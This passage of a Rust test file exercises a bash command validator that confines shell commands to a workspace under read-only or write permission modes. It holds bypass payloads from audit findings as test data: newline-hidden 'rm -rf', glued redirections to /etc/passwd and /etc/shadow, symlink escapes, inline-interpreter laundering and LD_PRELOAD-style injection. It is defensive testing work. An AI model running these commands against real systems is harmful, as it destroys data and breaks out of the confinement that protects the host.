    fn blocks_source_builtin_workspace_write() {
        let r = validate_bash_command("source /tmp/payload.sh", ws(), workspace());
        assert!(
            matches!(r, ValidationResult::Block { .. }),
            "source executes the file as shell code; got {r:?}"
        );
    }

    #[test]
    fn blocks_dot_builtin_workspace_write() {
        // POSIX `.` is the portable name for `source`.
        let r = validate_bash_command(". /tmp/payload.sh", ws(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_eval_after_pipe() {
        // Code-laundering check must inspect every segment, not just the
        // first command. `cat file | eval` is also opaque execution.
        let r = validate_bash_command("echo whoami | eval", ws(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn allows_evaluate_substring_in_other_commands() {
        // Word-boundary check: `evaluate`, `evaluation`, `eval-something`
        // are unrelated identifiers and must not match.
        let r = validate_bash_command("echo evaluate this", ws(), workspace());
        assert_eq!(r, ValidationResult::Allow);
    }

    #[test]
    fn allows_filename_containing_eval() {
        let r = validate_bash_command("cat /workspace/evaluator.log", ro(), workspace());
        assert_eq!(r, ValidationResult::Allow);
    }

    // ── newline as command separator ────────────────────────────────────────

    #[test]
    fn blocks_newline_separated_write_in_readonly() {
        // Audit 2026-05-14: `echo ok\nrm -rf /workspace/important` was
        // tokenized as a single segment whose first word was `echo`, so
        // the trailing destructive command slipped through.
        let r = validate_bash_command("echo ok\nrm -rf /workspace/important", ro(), workspace());
        assert!(
            matches!(r, ValidationResult::Block { .. }),
            "newline-separated rm must reach check_command_segment; got {r:?}"
        );
    }

    #[test]
    fn blocks_newline_separated_write_redirection_outside_workspace() {
        let r = validate_bash_command("echo first\necho second > /etc/passwd", ws(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn allows_newline_separated_safe_segments_in_readonly() {
        let r = validate_bash_command("cat file.txt\nls -la", ro(), workspace());
        assert_eq!(r, ValidationResult::Allow);
    }

    #[test]
    fn newline_inside_single_quotes_is_not_a_separator() {
        // Newline inside single quotes is literal data, not a statement
        // boundary; shell_split must keep the whole quoted segment as one
        // token so the validator does not see a spurious second statement.
        let r = validate_bash_command("echo 'line1\nline2'", ws(), workspace());
        assert_eq!(r, ValidationResult::Allow);
    }

    #[test]
    fn carriage_return_segments_like_newline() {
        // CRLF line endings must also be honored as separators so that
        // payloads composed on Windows hosts cannot bypass the check by
        // emitting `\r\n` instead of `\n`.
        let r = validate_bash_command("echo ok\r\nrm -rf /workspace/x", ro(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }
}

// ── Glued redirection and ln-symlink escape coverage ─────────────────────────
//
// Regression tests for the two HIGH findings in docs/audits/2026-05-14.md:
//
// 1. Glued `cmd>path` / `cmd>>path` / `cmd<path` redirection is not
//    tokenized in WorkspaceWrite, so `shell_split` keeps the whole thing
//    as one token and `write_targets_for_segment` / `read_targets_for_segment`
//    never see a redirection operator.
// 2. `ln`/`link` only validates the last non-flag argument as a target, so
//    `ln -s /etc/passwd workspace_link` passes — the source `/etc/passwd`
//    is unvalidated, and once the link exists a subsequent write to
//    `workspace_link` lands on the host path.
#[cfg(test)]
mod bash_glued_redirection_and_link_tests {
    use crate::bash::{validate_bash_command, PermissionMode, ValidationResult};
    use std::path::Path;

    fn ws() -> PermissionMode {
        PermissionMode::WorkspaceWrite
    }
    fn workspace() -> &'static Path {
        Path::new("/workspace")
    }

    // ── glued redirection ────────────────────────────────────────────────────

    #[test]
    fn blocks_glued_tee_write_redirection_workspace_write() {
        let r = validate_bash_command("tee>/etc/passwd", ws(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_glued_append_redirection_workspace_write() {
        let r = validate_bash_command("cat>>/etc/shadow", ws(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_glued_echo_write_redirection_workspace_write() {
        let r = validate_bash_command("echo x>/etc/cron.d/poc", ws(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_glued_read_redirection_workspace_write() {
        let r = validate_bash_command("cat</etc/shadow", ws(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn allows_glued_write_redirection_to_workspace_relative() {
        // After tokenization, the target is `out.txt` — still in-workspace.
        let r = validate_bash_command("echo x>out.txt", ws(), workspace());
        assert_eq!(r, ValidationResult::Allow);
    }

    #[test]
    fn allows_fd_duplication_2_amp_1() {
        // `2>&1` is fd duplication, not a path-bound write; the `&1`
        // suffix is intentionally skipped by `write_targets_for_segment`.
        let r = validate_bash_command("echo x > out.txt 2>&1", ws(), workspace());
        assert_eq!(r, ValidationResult::Allow);
    }

    #[test]
    fn blocks_fd_redirection_to_host_path() {
        // `2>/etc/passwd` redirects stderr to a host path — must still be
        // caught after glued tokenization.
        let r = validate_bash_command("echo x 2>/etc/passwd", ws(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    // ── ln / link symlink escape ─────────────────────────────────────────────

    #[test]
    fn blocks_ln_symlink_source_outside_workspace() {
        // Step 1 of the 2026-05-14 path-traversal-escape attack: even though
        // the destination `workspace_link` is workspace-relative, the source
        // `/etc/passwd` would, once linked, redirect any future write on the
        // link onto the host path.
        let r = validate_bash_command("ln -s /etc/passwd workspace_link", ws(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_link_hardlink_source_outside_workspace() {
        // Hardlinks share an inode, so a workspace-internal hardlink to
        // `/etc/passwd` exposes the host inode to in-workspace writes.
        let r = validate_bash_command("link /etc/passwd workspace_link", ws(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_ln_default_hardlink_source_outside_workspace() {
        // `ln` without `-s` defaults to hardlink semantics; same risk.
        let r = validate_bash_command("ln /etc/passwd workspace_link", ws(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn allows_ln_both_args_within_workspace() {
        // Source and destination both workspace-relative — legitimate use.
        let r = validate_bash_command("ln -s file_a file_b", ws(), workspace());
        assert_eq!(r, ValidationResult::Allow);
    }

    #[test]
    fn allows_cp_source_outside_dest_inside_workspace() {
        // `cp` reads from source and writes to destination; the inode is
        // not aliased, so an outside-workspace source remains safe to read
        // into the workspace. Only `ln`/`link` get the expanded rule.
        let r = validate_bash_command("cp /etc/passwd workspace_copy", ws(), workspace());
        assert_eq!(r, ValidationResult::Allow);
    }
}

// ── Interpreter laundering and quoted env-var injection coverage ─────────────
//
// Regression tests for the 2026-05-15 HIGH "Validator bypass" finding:
//
// 1. ReadOnly mode accepts interpreter wrappers (`python3 -c "..."`,
//    `perl -e`, `node -e`, `bash -c "..."`, etc.) because
//    `check_command_segment` only matches the first token against
//    `WRITE_COMMANDS` / `STATE_MODIFYING_COMMANDS`.
// 2. The `LD_PRELOAD` / `PYTHONPATH` / `NODE_OPTIONS` block at the top
//    of `validate_read_only` was a raw-substring scan, so quoting that
//    splits the literal across `shell_split` segments (e.g.
//    `env L'D'_PRELOAD=/tmp/e.so cat`) bypassed it. After bash quote-
//    stripping the token becomes `LD_PRELOAD=/tmp/e.so`; a token-prefix
//    scan catches it. The same token check also drops the false-positive
//    that the substring scan had on benign filenames containing the
//    literal (e.g. `cat /workspace/log_LD_PRELOAD.txt`).
#[cfg(test)]
mod bash_interpreter_and_env_injection_tests {
    use crate::bash::{validate_bash_command, PermissionMode, ValidationResult};
    use std::path::Path;

    fn ro() -> PermissionMode {
        PermissionMode::ReadOnly
    }
    fn workspace() -> &'static Path {
        Path::new("/workspace")
    }

    // ── interpreter wrappers in ReadOnly ────────────────────────────────────

    #[test]
    fn blocks_python3_dash_c_in_readonly() {
        let r = validate_bash_command(
            "python3 -c \"import os; os.system('rm -rf /workspace')\"",
            ro(),
            workspace(),
        );
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_python_dash_c_in_readonly() {
        let r = validate_bash_command("python -c 'print(1)'", ro(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_perl_dash_e_in_readonly() {
        let r = validate_bash_command("perl -e 'system(\"rm -rf /workspace\")'", ro(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_node_dash_e_in_readonly() {
        let r = validate_bash_command(
            "node -e \"require('child_process').execSync('rm -rf /workspace')\"",
            ro(),
            workspace(),
        );
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_ruby_dash_e_in_readonly() {
        let r = validate_bash_command("ruby -e 'system(\"id\")'", ro(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_bash_dash_c_in_readonly() {
        let r = validate_bash_command("bash -c 'echo hi'", ro(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_sh_dash_c_in_readonly() {
        let r = validate_bash_command("sh -c 'echo hi'", ro(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_awk_program_via_dash_e_in_readonly() {
        // `awk -e 'BEGIN{system("...")}` is the awk equivalent.
        let r = validate_bash_command("awk -e 'BEGIN{system(\"id\")}'", ro(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_php_dash_r_in_readonly() {
        let r = validate_bash_command("php -r 'echo 1;'", ro(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_sudo_bash_dash_c_in_readonly() {
        // sudo recursion should re-enter check_command_segment, so the
        // wrapped interpreter is also caught.
        let r = validate_bash_command("sudo bash -c 'echo hi'", ro(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn allows_python3_running_a_script_in_readonly() {
        // No `-c` / `-e` / `-r`: running a script file is treated as a
        // process invocation, not arbitrary inline code. The wedge does
        // not introspect script contents.
        let r = validate_bash_command("python3 script.py", ro(), workspace());
        assert_eq!(r, ValidationResult::Allow);
    }

    #[test]
    fn allows_interpreter_version_query_in_readonly() {
        let r = validate_bash_command("python3 --version", ro(), workspace());
        assert_eq!(r, ValidationResult::Allow);
    }

    // ── environment-variable injection (quoted bypass) ──────────────────────

    #[test]
    fn blocks_unquoted_ld_preload_in_readonly() {
        let r = validate_bash_command("LD_PRELOAD=/tmp/e.so cat /tmp/f", ro(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_quoted_ld_preload_concatenation_in_readonly() {
        // Audit 2026-05-15: `env L'D'_PRELOAD=/tmp/e.so cat` — bash
        // concatenates `L` + `D_PRELOAD=...` after expansion, so shell_split
        // returns a single token `LD_PRELOAD=/tmp/e.so` even though the
        // raw command does not contain the literal substring.
        let r = validate_bash_command("env L'D'_PRELOAD=/tmp/e.so cat /tmp/f", ro(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_dyld_insert_libraries_in_readonly() {
        let r = validate_bash_command(
            "DYLD_INSERT_LIBRARIES=/tmp/e.dylib cat /tmp/f",
            ro(),
            workspace(),
        );
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_pythonpath_injection_in_readonly() {
        let r = validate_bash_command("PYTHONPATH=/tmp/evil python3 -m mymod", ro(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_node_options_injection_in_readonly() {
        let r = validate_bash_command(
            "NODE_OPTIONS='--require /tmp/evil.js' node app.js",
            ro(),
            workspace(),
        );
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn allows_filename_containing_env_var_literal_in_readonly() {
        // False-positive that the old raw-substring check produced:
        // a filename happening to contain the string `LD_PRELOAD` was
        // wrongly blocked. The token-prefix scan no longer trips on it.
        let r = validate_bash_command("cat /workspace/log_LD_PRELOAD.txt", ro(), workspace());
        assert_eq!(r, ValidationResult::Allow);
    }
}
